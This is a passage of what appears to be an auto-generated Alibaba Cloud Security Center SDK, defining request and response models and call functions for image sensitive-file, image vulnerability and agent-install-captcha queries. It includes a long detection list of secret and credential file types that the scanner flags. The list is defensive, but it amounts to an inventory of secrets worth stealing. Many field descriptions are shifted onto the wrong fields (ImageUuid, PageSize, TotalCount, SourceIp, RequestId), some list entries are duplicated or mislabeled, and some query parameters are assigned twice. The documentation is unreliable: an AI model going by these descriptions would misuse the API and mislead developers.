>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the UUIDs of images from the value of the **ImageUuid** response parameter.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The query type of sensitive files. Valid values:

*   **SensitiveFileKey**: the alert type for sensitive files. Valid values:

    *   **npm_token**: npm access token
    *   **ftp_cfg**: FTP configuration
    *   **google_oauth_key**: Google OAuth key
    *   **planetscale_passwd**: PlanetScale password
    *   **github_ssh_key**: GitHub SSH key
    *   **msbuild_publish_profile**: MSBuild publish profile
    *   **fastly_cdn_token**: Fastly CDN token
    *   **ssh_private_key**: SSH private key
    *   **aws_cli**: AWS CLI credential
    *   **cpanel_proftpd**: cPanel ProFTPD credential
    *   **postgresql_passwd**: PostgreSQL password file
    *   **discord_client_cred**: Discord client credential
    *   **rails_database**: Rails database configuration
    *   **aws_access_key**: AWS access key
    *   **esmtp_cfg** :configuration of Extended Simple Mail Transfer Protocol (ESMTP)
    *   **docker_registry_cfg**: configuration of a Docker image repository
    *   **pem**: Privacy-Enhanced Mail (PEM)
    *   **common_cred**: common credential
    *   **sftp_cfg**: SFTP connection configuration
    *   **grafana_token**: Grafana token
    *   **slack_token**: Slack token
    *   **ec_private_key**: EC private key
    *   **pypi_token**: upload token for the Python Package Index (PyPI)
    *   **finicity_token**: Finicity token
    *   **k8s_client_key**: Kubernetes private key
    *   **git_cfg**: Git configuration
    *   **django_key**: Django key
    *   **jenkins_ssh**: Jenkins SSH configuration file
    *   **openssh_private_key**: OpenSSL private key
    *   **square_oauth**: OAuth credential for Square
    *   **typeform_token**: Typeform token
    *   **common_database_cfg**: general database connection configuration
    *   **wordpress_database_cfg**: WordPress database configuration
    *   **googlecloud_api_key**: API key for Google Cloud
    *   **vscode_sftp**: VSCode SFTP configuration
    *   **apache_htpasswd**: Apache htpasswd
    *   **planetscale_token**: PlanetScale token
    *   **contentful_preview_token**: preview token for Contentful
    *   **php_database_cfg**: database password for a PHP application
    *   **atom_remote_sync**: Atom remote synchronization configuration
    *   **aws_session_token**: AWS session token
    *   **atom_sftp_cfg**: Atom SFTP configuration
    *   **tencentcloud_ak**: Asana client key
    *   **tencentcloud_ak**: secret ID of a third-party cloud
    *   **rsa_private_key**: RSA private key
    *   **github_personal_token**: personal access token for GitHub
    *   **pgp**: Pretty Good Privacy (PGP) encrypted file
    *   **stripe_skpk**: Stripe secret key
    *   **square_token**: Square access token
    *   **rails_carrierwave**: file upload credential for Rails Carrierwave
    *   **dbeaver_database_cfg**: DBeaver database configuration
    *   **robomongo_cred**: credential for RoboMongo
    *   **github_oauth_token**: OAuth access token for GitHub
    *   **pulumi_token**: Pulumi token
    *   **ventrilo_voip**: configuration of a Ventrilo VoIP server
    *   **macos_keychain**: macOS keychain
    *   **amazon_mws_token**: Amazon MWS token
    *   **dynatrace_token**: Dynatrace token
    *   **java_keystore**: Java KeyStore (JKS)
    *   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database
    *   **kubernetes_dashboard_cred**: user credential for Kubernetes Dashboard
    *   **atlassian_token**: Atlassian token
    *   **rdp**: remote desktop protocol (RDP)
    *   **mailgun_key**: Mailgun webhook signing key
    *   **mailchimp_api_key**: API key for Mailchimp
    *   **netrc_cfg**: .netrc configuration file
    *   **openvpn_cfg**: OpenVPN configuration
    *   **github_refresh_token**: GitHub refresh token
    *   **salesforce**: Salesforce credential
    *   **salesforce**: Sendinblue credential
    *   **pkcs_private_key**: PKCS#12 key
    *   **rubyonrails_passwd**: Ruby on Rails password file
    *   **filezilla_ftp**: FileZilla FTP configuration
    *   **databricks_token**: Databricks token
    *   **gitLab_personal_toke**: personal access token for GitLab
    *   **rails_master_key**: Rails master key
    *   **sqlite**: SQLite3 or SQLite database
    *   **firefox_logins**: Firefox logon configuration
    *   **mailgun_private_token**: Mailgun private token
    *   **joomla_cfg**: Joomla configuration
    *   **hashicorp_terraform_token**: HashiCorp Terraform token
    *   **jetbrains_ides**: JetBrains IDEs configuration
    *   **heroku_api_key**: Heroku API key
    *   **messagebird_token**: MessageBird token
    *   **messagebird_token**: MessageBird token
    *   **hashicorp_vault_token**: HashiCorp Vault token
    *   **pgp_private_key**: PGP private key
    *   **sshpasswd**: SSH password
    *   **huaweicloud_ak**: secret access key of a third-party cloud
    *   **aws_s3cmd**: AWS S3cmd configuration
    *   **php_config**: PHP configuration
    *   **common_private_key**: private key of a common type
    *   **microsoft_mdf**: Microsoft SQL Server database
    *   **mediawiki_cfg**: MediaWiki configuration
    *   **jenkins_cred**: Jenkins credential
    *   **rubygems_cred**: RubyGems credential
    *   **clojars_token**: Clojars token
    *   **phoenix_web_passwd**: Phoenix web credential
    *   **puttygen_private_key**: PuTTYgen private key
    *   **google_oauth_token**: Google OAuth access token
    *   **rubyonrails_cfg**: Ruby On Rails database configuration
    *   **lob_api_key**: Lob API key
    *   **pkcs_cred**: PKCS#12 certificate
    *   **otr_private_key**: Off-the-Record Messaging (OTR) private key
    *   **contentful_delivery_token**: delivery token for Contentful
    *   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration
    *   **dsa_private_key**: Digital Signature Algorithm (DSA) private key
    *   **rails_app_token**: Rails app token
    *   **git_cred**: Git user credential
    *   **newrelic_api_key**: User API key for New Relic
    *   **github_hub**: hub configuration for storing GitHub tokens
    *   **rubygem**: RubyGem token

*   **SensitiveFileName**: the name of the alert type for sensitive files.', example='850613a48999900f48417c7e6e9dcfdd'),
  lang?: string(name='Lang', description='An array that consists of the information about the sensitive files.', example='zh'),
  pageSize?: int32(name='PageSize', description='The returned information about the sensitive files.', example='20'),
  riskLevel?: string(name='RiskLevel', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='low'),
  scanRangeShrink?: string(name='ScanRange', description='The key of the last data entry.'),
}

model DescribeImageSensitiveFileListResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', example='1'),
    currentPage?: int32(name='CurrentPage', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1'),
    lastRowKey?: string(name='LastRowKey', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY1Nzg2NTcxNjE2NDc4NjE='),
    pageSize?: int32(name='PageSize', description='Queries information about sensitive files.', example='20'),
    totalCount?: int32(name='TotalCount', description='DescribeImageSensitiveFileList', example='149'),
  }(name='PageInfo', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**'),
  requestId?: string(name='RequestId', example='8D19A089-E6BC-5244-800C-7E590D50487F'),
  sensitiveFileList?: [ 
    {
      count?: int32(name='Count', description='The type of the asset that you want to scan. Valid values:

*   **image**
*   **container**', example='9'),
      firstScanTime?: long(name='FirstScanTime', description='The alert type for the sensitive file. Valid values:

*   **npm_token**: npm access token
*   **ftp_cfg**: FTP configuration
*   **google_oauth_key**: Google OAuth key
*   **planetscale_passwd**: PlanetScale password
*   **github_ssh_key**: GitHub SSH key
*   **msbuild_publish_profile**: MSBuild publish profile
*   **fastly_cdn_token**: Fastly CDN token
*   **ssh_private_key**: SSH private key
*   **aws_cli**: AWS CLI credential
*   **cpanel_proftpd**: cPanel ProFTPD credential
*   **postgresql_passwd**: PostgreSQL password file
*   **discord_client_cred**: Discord client credential
*   **rails_database**: Rails database configuration
*   **aws_access_key**: AWS access key
*   **esmtp_cfg** :configuration of ESMTP
*   **docker_registry_cfg**: configuration of a Docker image repository
*   **pem**: PEM
*   **common_cred**: common credential
*   **sftp_cfg**: SFTP connection configuration
*   **grafana_token**: Grafana token
*   **slack_token**: Slack token
*   **ec_private_key**: EC private key
*   **pypi_token**: upload token for the PyPI
*   **finicity_token**: Finicity token
*   **k8s_client_key**: Kubernetes private key
*   **git_cfg**: Git configuration
*   **django_key**: Django key
*   **jenkins_ssh**: Jenkins SSH configuration file
*   **openssh_private_key**: OpenSSL private key
*   **square_oauth**: OAuth credential for Square
*   **typeform_token**: Typeform token
*   **common_database_cfg**: general database connection configuration
*   **wordpress_database_cfg**: WordPress database configuration
*   **googlecloud_api_key**: API key for Google Cloud
*   **vscode_sftp**: VSCode SFTP configuration
*   **apache_htpasswd**: Apache htpasswd
*   **planetscale_token**: PlanetScale token
*   **contentful_preview_token**: preview token for Contentful
*   **php_database_cfg**: database password for a PHP application
*   **atom_remote_sync**: Atom remote synchronization configuration
*   **aws_session_token**: AWS session token
*   **atom_sftp_cfg**: Atom SFTP configuration
*   **tencentcloud_ak**: Asana client key
*   **tencentcloud_ak**: secret ID of a third-party cloud
*   **rsa_private_key**: RSA private key
*   **github_personal_token**: personal access token for GitHub
*   **pgp**: PGP encrypted file
*   **stripe_skpk**: Stripe secret key
*   **square_token**: Square access token
*   **rails_carrierwave**: file upload credential for Rails Carrierwave
*   **dbeaver_database_cfg**: DBeaver database configuration
*   **robomongo_cred**: credential for RoboMongo
*   **github_oauth_token**: OAuth access token for GitHub
*   **pulumi_token**: Pulumi token
*   **ventrilo_voip**: configuration of a Ventrilo VoIP server
*   **macos_keychain**: macOS keychain
*   **amazon_mws_token**: Amazon MWS token
*   **dynatrace_token**: Dynatrace token
*   **java_keystore**: JKS
*   **microsoft_sdf**: Microsoft SQL Server CE database
*   **kubernetes_dashboard_cred**: user credential for Kubernetes Dashboard
*   **atlassian_token**: Atlassian token
*   **rdp**: RDP
*   **mailgun_key**: Mailgun webhook signing key
*   **mailchimp_api_key**: API key for Mailchimp
*   **netrc_cfg**: .netrc configuration file
*   **openvpn_cfg**: OpenVPN configuration
*   **github_refresh_token**: GitHub refresh token
*   **salesforce**: Salesforce credential
*   **salesforce**: Sendinblue credential
*   **pkcs_private_key**: PKCS#12 key
*   **rubyonrails_passwd**: Ruby on Rails password file
*   **filezilla_ftp**: FileZilla FTP configuration
*   **databricks_token**: Databricks token
*   **gitLab_personal_toke**: personal access token for GitLab
*   **rails_master_key**: Rails master key
*   **sqlite**: SQLite3 or SQLite database
*   **firefox_logins**: Firefox logon configuration
*   **mailgun_private_token**: Mailgun private token
*   **joomla_cfg**: Joomla configuration
*   **hashicorp_terraform_token**: HashiCorp Terraform token
*   **jetbrains_ides**: JetBrains IDEs configuration
*   **heroku_api_key**: Heroku API key
*   **messagebird_token**: MessageBird token
*   **messagebird_token**: MessageBird token
*   **hashicorp_vault_token**: HashiCorp Vault token
*   **pgp_private_key**: PGP private key
*   **sshpasswd**: SSH password
*   **huaweicloud_ak**: secret access key of a third-party cloud
*   **aws_s3cmd**: AWS S3cmd configuration
*   **php_config**: PHP configuration
*   **common_private_key**: private key of a common type
*   **microsoft_mdf**: Microsoft SQL Server database
*   **mediawiki_cfg**: MediaWiki configuration
*   **jenkins_cred**: Jenkins credential
*   **rubygems_cred**: RubyGems credential
*   **clojars_token**: Clojars token
*   **phoenix_web_passwd**: Phoenix web credential
*   **puttygen_private_key**: PuTTYgen private key
*   **google_oauth_token**: Google OAuth access token
*   **rubyonrails_cfg**: Ruby On Rails database configuration
*   **lob_api_key**: Lob API key
*   **pkcs_cred**: PKCS#12 certificate
*   **otr_private_key**: OTR private key
*   **contentful_delivery_token**: delivery token for Contentful
*   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration
*   **dsa_private_key**: Digital DSA private key
*   **rails_app_token**: Rails app token
*   **git_cred**: Git user credential
*   **newrelic_api_key**: User API key for New Relic
*   **github_hub**: hub configuration for storing GitHub tokens
*   **rubygem**: RubyGem token', example='1663321552000'),
      lastScanTime?: long(name='LastScanTime', description='An array that consists of the types of the assets that you want to scan. Valid values:

*   **image**
*   **container**', example='1663321552000'),
      riskLevel?: string(name='RiskLevel', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='high'),
      sensitiveFileKey?: string(name='SensitiveFileKey', description='The pagination information.', example='google_oauth_key'),
      sensitiveFileName?: string(name='SensitiveFileName', description='The name of the alert type for the sensitive file.', example='AccessKeyLeak'),
    }
  ](name='SensitiveFileList', description='The number of entries to return on each page. Default value: 20.'),
  success?: boolean(name='Success', example='true'),
}

model DescribeImageSensitiveFileListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageSensitiveFileListResponseBody(name='body'),
}

async function describeImageSensitiveFileListWithOptions(tmpReq: DescribeImageSensitiveFileListRequest, runtime: Util.RuntimeOptions): DescribeImageSensitiveFileListResponse {
  Util.validateModel(tmpReq);
  var request = new DescribeImageSensitiveFileListShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.scanRange)) {
    request.scanRangeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.scanRange, 'ScanRange', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.scanRangeShrink)) {
    query['ScanRange'] = request.scanRangeShrink;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageSensitiveFileList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageSensitiveFileList(request: DescribeImageSensitiveFileListRequest): DescribeImageSensitiveFileListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageSensitiveFileListWithOptions(request, runtime);
}

model DescribeImageStatisticsResponseBody = {
  instanceCount?: int32(name='InstanceCount', example='5'),
  requestId?: string(name='RequestId', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
  riskInstanceCount?: int32(name='RiskInstanceCount', example='2'),
}

model DescribeImageStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageStatisticsResponseBody(name='body'),
}

/**
  * Queries the risk statistics of container images.
  *
  * @param request DescribeImageStatisticsRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeImageStatisticsResponse
 */
async function describeImageStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeImageStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeImageStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * Queries the risk statistics of container images.
  *
  * @return DescribeImageStatisticsResponse
 */
async function describeImageStatistics(): DescribeImageStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageStatisticsWithOptions(runtime);
}

model DescribeImageVulListRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='High severity vulnerability that affects org.eclipse.jetty:jetty-server'),
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.', example='cc20a1024011c44b6a8710d6f8b****'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
  containerId?: string(name='ContainerId', description='The ID of the container.', example='c08d5fc1a329a4b88950a253d082f****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is handled. Valid values:

*   **y**: handled
*   **n**: unhandled', example='y'),
  digest?: string(name='Digest', description='The digest of the image.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d507012'),
  image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-****'),
  instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='1-qeqewqw****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The name of the vulnerability.', example='debian:10:CVE-2019-9893'),
  namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high. You must fix the vulnerability at the earliest opportunity.
*   **later**: medium. You can fix the vulnerability based on your business requirements.
*   **nntf**: low. You can ignore the vulnerability.', example='asap'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**', example='10'),
  pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
  regionId?: string(name='RegionId', description='The region ID of the instance.', example='cn-hangzhou'),
  repoId?: string(name='RepoId', description='The ID of the image repository.', example='qew****'),
  repoInstanceId?: string(name='RepoInstanceId', description='The instance ID of the image repository.', example='i-qewqrqcsadf****'),
  repoName?: string(name='RepoName', description='The name of the image repository.', example='libssh2'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-hangzhou'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.'),
  statusList?: string(name='StatusList', description='The status of the vulnerability. Valid values:

*   **1**: unfixed
*   **4**: being fixed
*   **7**: fixed', example='1'),
  tag?: string(name='Tag', description='The tag that is added to the image.', example='oval'),
  type?: string(name='Type', description='The type of the vulnerability. Set the value to **cve**, which indicates image vulnerabilities.', example='cve'),
  uuids?: string(name='Uuids', description='The UUIDs of the assets. Separate multiple UUIDs with commas (,).', example='0004a32a0305a7f6ab5ff9600d47****'),
}

model DescribeImageVulListResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**', example='10'),
  requestId?: string(name='RequestId', description='The request ID.', example='D6B20156-49B0-5CF0-B14D-7ECA4B50DAAB'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  vulRecords?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='CVE-2018-25010:libwebp up to 1.0.0 ApplyFilter out-of-bounds read'),
      canFix?: string(name='CanFix', description='Indicates whether the vulnerability can be fixed in the Security Center console. Valid values:

*   **yes**
*   **no**', example='yes'),
      canUpdate?: boolean(name='CanUpdate', description='Indicates whether the packages of the software that has the vulnerability can be upgraded by using Security Center. Valid values:

*   **true**
*   **false**', example='true'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c08d5fc1a329a4b88950a253d082f1****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='04d20e98c8e2c93b7b864372084320a15a58c8671e53c972ce3a71d9c163****'),
      extendContentJson?: {
        os?: string(name='Os', description='The name of the operating system.', example='debian'),
        osRelease?: string(name='OsRelease', description='The version of the operating system in the image.', example='10.9'),
        rpmEntityList?: [ 
          {
            fullVersion?: string(name='FullVersion', description='The complete version number of the package.', example='2.3.3-4'),
            layer?: string(name='Layer', description='The SHA-256 value of the digest of the image layer.', example='b1f5b9420803ad0657cf21566e3e20acc08581e7f22991249ef3aa80b8b1c587'),
            matchDetail?: string(name='MatchDetail', description='The reason why the vulnerability is detected.', example='libseccomp2 version less than equals 2.3.3-4'),
            matchList?: [ string ](name='MatchList', description='The details of the rules that are used to detect the vulnerability.', example='["libseccomp2 version less than equals 2.3.3-4"]'),
            name?: string(name='Name', description='The name of the software package.', example='libseccomp2'),
            path?: string(name='Path', description='The path to the software that has the vulnerability.', example='/usr/lib64/libssh2.so.1'),
            updateCmd?: string(name='UpdateCmd', description='The command that is used to fix the vulnerability.', example='apt-get update && apt-get install libseccomp2  --only-upgrade'),
            version?: string(name='Version', description='The version number of the package.', example='2.3.3-4'),
          }
        ](name='RpmEntityList', description='The details of the packages of the software that has the vulnerability.'),
      }(name='ExtendContentJson', description='The extended information about the vulnerability.'),
      firstTs?: long(name='FirstTs', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='1620752053000'),
      image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-conta****'),
      imageDigest?: string(name='ImageDigest', description='The digest of the image.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d507012'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='testInstance'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.19.XX.XX'),
      lastTs?: long(name='LastTs', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1631779996000'),
      layers?: [ string ](name='Layers', description='The image layers.'),
      maliciousSource?: string(name='MaliciousSource', description='The source of the malicious file. Valid values:

*   **agentless**: agentless detection
*   **image**: image
*   **container**: container', example='agentless'),
      modifyTs?: long(name='ModifyTs', description='The timestamp when the information about the vulnerability was updated. Unit: milliseconds.', example='1580808765000'),
      name?: string(name='Name', description='The name of the vulnerability.', example='debian:10:CVE-2019-9893'),
      namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
      necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high. You must fix the vulnerability at the earliest opportunity.
*   **later**: medium. You can fix the vulnerability based on your business requirements.
*   **nntf**: low. You can ignore the vulnerability.', example='asap'),
      pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
      primaryId?: long(name='PrimaryId', description='The ID of the vulnerability.', example='782661'),
      related?: string(name='Related', description='The Common Vulnerabilities and Exposures (CVE) ID of the associated vulnerability.', example='CVE-2019-9893'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='varnish'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='default'),
      scanTime?: long(name='ScanTime', description='The time at which the scan was performed. This value is a UNIX timestamp representing the number of milliseconds that have elapsed since January 1, 1970, 00:00:00 UTC.', example='1649814050000'),
      status?: int32(name='Status', description='The status of the vulnerability. Valid values:

*   **1**: unfixed
*   **7**: fixed', example='1'),
      tag?: string(name='Tag', description='The tag that is added to the vulnerability.', example='oval'),
      targetId?: string(name='TargetId', description='The ID of the asset on which the vulnerability is detected.', example='m-bp17m0pc0xprzbwo****'),
      targetName?: string(name='TargetName', description='The name of the asset on which the vulnerability is detected.', example='source-test-obj-XM0Ma'),
      targetType?: string(name='TargetType', description='The type of the asset on which the vulnerability is detected. Valid values:

*   **ECS_IMAGE**: image
*   **ECS_SNAPSHOT**: snapshot', example='ECS_IMAGE'),
      type?: string(name='Type', description='The type of the vulnerability. The value is fixed as cve, which indicates image vulnerabilities.', example='cve'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='0004a32a0305a7f6ab5ff9600d47****'),
    }
  ](name='VulRecords', description='The vulnerabilities.'),
}

model DescribeImageVulListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageVulListResponseBody(name='body'),
}

/**
  * To query the information about the recently detected image vulnerabilities, call the [PublicCreateImageScanTask](~~PublicCreateImageScanTask~~) operation. Wait 1 to 5 minutes until the call is successful and call the DescribeImageVulList operation.
  *
  * @param request DescribeImageVulListRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeImageVulListResponse
 */
async function describeImageVulListWithOptions(request: DescribeImageVulListRequest, runtime: Util.RuntimeOptions): DescribeImageVulListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.containerId)) {
    query['ContainerId'] = request.containerId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.digest)) {
    query['Digest'] = request.digest;
  }
  if (!Util.isUnset(request.image)) {
    query['Image'] = request.image;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pod)) {
    query['Pod'] = request.pod;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageVulList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * To query the information about the recently detected image vulnerabilities, call the [PublicCreateImageScanTask](~~PublicCreateImageScanTask~~) operation. Wait 1 to 5 minutes until the call is successful and call the DescribeImageVulList operation.
  *
  * @param request DescribeImageVulListRequest
  * @return DescribeImageVulListResponse
 */
async function describeImageVulList(request: DescribeImageVulListRequest): DescribeImageVulListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageVulListWithOptions(request, runtime);
}

model DescribeInstallCaptchaRequest {
  deadline?: string(name='Deadline', description='The ID of the request.', example='2020-10-11 16:26:22'),
  lang?: string(name='Lang', description='The validity period of the installation verification code. If this parameter is not specified, the validity period is 1 hour.

>  The installation verification code is valid only within the validity period. An expired installation verification code cannot be used to install the agent.', example='zh'),
  sourceIp?: string(name='SourceIp', description='zh', example='192.168.XX.XX'),
}

model DescribeInstallCaptchaResponseBody = {
  captchaCode?: string(name='CaptchaCode', description='Queries the verification code for you to manually install the Security Center agent.', example='M1HH**'),
  deadline?: string(name='Deadline', description='The source IP address of the request.', example='2020-10-10 16:06:38'),
  requestId?: string(name='RequestId', description='192.168.XX.XX', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
}

model DescribeInstallCaptchaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstallCaptchaResponseBody(name='body'),
}

async function describeInstallCaptchaWithOptions(request: DescribeInstallCaptchaRequest, runtime: Util.RuntimeOptions): DescribeInstallCaptchaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.deadline)) {
    query['Deadline'] = request.deadline;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstallCaptcha',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstallCaptcha(request: DescribeInstallCaptchaRequest): DescribeInstallCaptchaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstallCaptchaWithOptions(request, runtime);
}

model DescribeInstallCodeResponseBody = {
  code?: string(name='Code', example='200'),
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
}

model DescribeInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstallCodeResponseBody(name='body'),
}

async function describeInstallCodeWithOptions(runtime: Util.RuntimeOptions): DescribeInstallCodeResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
